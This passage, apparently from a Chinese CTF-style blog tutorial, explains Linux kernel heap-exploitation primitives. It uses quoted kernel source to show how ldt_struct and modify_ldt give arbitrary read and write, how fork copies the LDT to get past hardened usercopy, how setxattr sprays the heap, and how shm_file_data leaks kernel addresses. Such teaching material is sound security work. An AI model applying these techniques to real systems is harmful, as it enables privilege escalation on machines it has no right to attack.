class="comment">/*</span></span><br><span class="line"><span class="comment"> * ldt_structs can be allocated, used, and freed, but they are never</span></span><br><span class="line"><span class="comment"> * modified while live.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment"> * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment"> * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment"> * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>*<span class="title">entries</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>nr_entries;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment"> * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment"> * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment"> * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment"> * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>结构体大小是<code>0x10</code>,slub中会在<code>kmalloc-16</code>申请,slab则会在<code>kmalloc-32</code>申请</p><p>entries指向一个数组</p><p>nr_entries记录着数组的数量</p><p><code>struct desc_struct</code>即使段描述符,定义如下(<code>/arch/x86/include/asm/desc_defs.h</code>),暂时不管他</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 8 byte segment descriptor */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">u16limit0;</span><br><span class="line">u16base0;</span><br><span class="line">u16base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">u16limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><p>Linux 提供 <code>modify_ldt</code> 系统调用，通过该系统调用可以<strong>获取或修改当前进程的 LDT</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (func) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">ret = read_ldt(ptr, bytecount);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">ret = read_default_ldt(ptr, bytecount);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment"> * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment"> * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment"> * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment"> * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment"> * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment"> * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="read-ldt"><a href="#read-ldt" class="headerlink" title="read_ldt"></a>read_ldt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> entries_size;</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">down_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mm-&gt;context.ldt) &#123;</span><br><span class="line">retval = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bytecount &gt; LDT_ENTRY_SIZE * LDT_ENTRIES)</span><br><span class="line">bytecount = LDT_ENTRY_SIZE * LDT_ENTRIES;</span><br><span class="line"></span><br><span class="line">entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line"><span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">entries_size = bytecount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (entries_size != bytecount) &#123;</span><br><span class="line"><span class="comment">/* Zero-fill the rest and pretend we read bytecount bytes. */</span></span><br><span class="line"><span class="keyword">if</span> (clear_user(ptr + entries_size, bytecount - entries_size)) &#123;</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">retval = bytecount;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中两个常量宏的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRIES8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRY_SIZE8</span></span><br></pre></td></tr></table></figure><p>重点看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们能够修改ldt结构的entries结构,便能够做到任意读</p><p>并且copy_from_user和copy_to_user的返回值均是未成功copy的数量,可以以此判断是否命中</p><h4 id="大范围搜索内存"><a href="#大范围搜索内存" class="headerlink" title="大范围搜索内存"></a>大范围搜索内存</h4><p>不过就算read_ldt能够帮助我们搜索内存,但是仍然无法完全避免<code>hardened usercopy</code>的影响</p><p>但观察 fork 系统调用的源码，我们可以发现如下执行链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys_fork()</span><br><span class="line">    kernel_clone()</span><br><span class="line">        copy_process()</span><br><span class="line">            copy_mm()</span><br><span class="line">                dup_mm()</span><br><span class="line">                    dup_mmap()</span><br><span class="line">                        arch_dup_mmap()</span><br><span class="line">                            ldt_dup_context()</span><br></pre></td></tr></table></figure><p>ldt_dup_context() 定义于 <code>arch/x86/kernel/ldt.c</code> 中，逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>new_ldt-&gt;nr_entries</code>由<code>old_ldt-&gt;nr_entries</code>赋值</p><p>在这里会通过 memcpy 将父进程的 ldt-&gt;entries 拷贝给子进程，<strong>是完全处在内核中的操作</strong>,因此能够绕过<code>hardened usercopy</code>的检查</p><p>当父进程设置目标地址后,再打开子进程,便会将目标地址处的内容复制到子进程的ldt中,之后再使用read_ldt便能够直接读取</p><h3 id="write-ldt"><a href="#write-ldt" class="headerlink" title="write_ldt"></a>write_ldt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">error = -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.contents == <span class="number">3</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (oldmode)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.seg_not_present == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">    LDT_empty(&amp;ldt_info)) &#123;</span><br><span class="line"><span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span class="keyword">sizeof</span>(ldt));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!IS_ENABLED(CONFIG_X86_16BIT) &amp;&amp; !ldt_info.seg_32bit) &#123;</span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line"><span class="keyword">if</span> (oldmode)</span><br><span class="line">ldt.avl = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;context.ldt_usr_sem))</span><br><span class="line"><span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line">old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">error = -ENOMEM;</span><br><span class="line">new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line">finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we are using PTI, map the new LDT into the userspace pagetables.</span></span><br><span class="line"><span class="comment"> * If there is already an LDT, use the other slot so that other CPUs</span></span><br><span class="line"><span class="comment"> * will continue to use the old LDT until install_ldt() switches</span></span><br><span class="line"><span class="comment"> * them over to the new LDT.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error = map_ldt_struct(mm, new_ldt, old_ldt ? !old_ldt-&gt;slot : <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This only can fail for the first LDT setup. If an LDT is</span></span><br><span class="line"><span class="comment"> * already installed then the PTE page is already</span></span><br><span class="line"><span class="comment"> * populated. Mop up a half populated page table.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!WARN_ON_ONCE(old_ldt))</span><br><span class="line">free_ldt_pgtables(mm);</span><br><span class="line">free_ldt_struct(new_ldt);</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">install_ldt(mm, new_ldt);</span><br><span class="line">unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">free_ldt_struct(old_ldt);</span><br><span class="line">error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们主要关注</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br></pre></td></tr></table></figure><p><code>new_ldt</code>是新申请出来的object,在alloc之后memcpy之前有一个窗口期,若是我么能够在这期间竞争修改<code>new_ldt-&gt;entries</code>,那么便能够做到任意写,不过这个窗口期比较短,实际运用成功率较低</p><p>但我们还可以注意到<code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</code>这一句,memcpy函数拷贝的长度是<code>old_nr_entries * LDT_ENTRY_SIZE</code></p><p>这个数据量相对较大,那么如果能够在memcpy函数执行的过程中通过竞争修改<code>new_ldt-&gt;entries</code>,也能够做到小范围的任意写</p><p>至于任意写的值其实也并不是完全受我们控制,不过可以根据我们传入的结构体,在一定程度上进行控制(具体可以看这个函数的完整流程)</p><p>我们<u>需要传入的结构体</u>的定义如下,新的ldt一定程度上受这个结构体控制,可以根据要求更改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS</span></span><br><span class="line"><span class="comment"> * not to the default values if you still want to do syscalls. This</span></span><br><span class="line"><span class="comment"> * call is more for 32bit mode therefore.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  entry_number;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  base_addr;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  limit;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  contents:<span class="number">2</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __x86_64__</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment"> * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment"> * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment"> * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment"> * actual value.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="setxattr"><a href="#setxattr" class="headerlink" title="setxattr"></a>setxattr</h2><p><strong>申请obj大小:任意</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:堆占位</strong></p><p>观察 setxattr 源码，发现如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()</span><br><span class="line">    path_setxattr()</span><br><span class="line">        setxattr()</span><br></pre></td></tr></table></figure><p>在 <code>setxattr()</code> 函数中有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span><br><span class="line"><span class="params">     <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 value 和 size 都是由我们来指定的，即<strong>我们可以分配任意大小的 object 并向其中写入内容，之后该对象会被释放掉</strong></p><p>使用时按照以下格式,其中第一个字符串需要是本进程的文件路径,第二个字符串任意</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;abcdefg&quot;</span>, &amp;buf,len,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p><strong>通常需要配合 userfaultfd 系统调用</strong>完成进一步的利用</p><h2 id="shm-file-data"><a href="#shm-file-data" class="headerlink" title="shm_file_data"></a>shm_file_data</h2><p><strong>申请obj大小:32</strong></p><p><strong>GFP_KERNEL_ACCOUNT:否</strong></p><p><strong>功能:.text泄露</strong></p><p>这个结构体主要是用于泄露内核基址的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line"><span class="type">int</span> id;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>大小为<code>0x20</code>,从kmalloc-32中分配</p><p>其中的 ns字段和vm_ops字段皆指向内核的<code>.text</code>段中</p><p>file字段位于内核线性映射区,能够泄露内核堆地址</p><p>有四个相关函数<code>shmget</code>、<code>shmat</code>、<code>shmctl</code>、<code>shmdt</code></p><h3 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h3><p>使用 <code>shmget</code> 系统调用可以获得一个共享内存对象，随后要使用 <code>shmat</code> 系统调用将共享内存对象映射到进程的地址空间</p><p><strong>shmget</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(shmget, <span class="type">key_t</span>, key, <span class="type">size_t</span>, size, <span class="type">int</span>, shmflg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ksys_shmget(key, size, shmflg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般这样调用,key可以是任意整型,返回一个shmid</p><p><code>shm_id = shmget(114514, 0x1000, SHM_R | SHM_W | IPC_CREAT);</code></p><p><strong>shmat</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(shmat, <span class="type">int</span>, shmid, <span class="type">char</span> __user *, shmaddr, 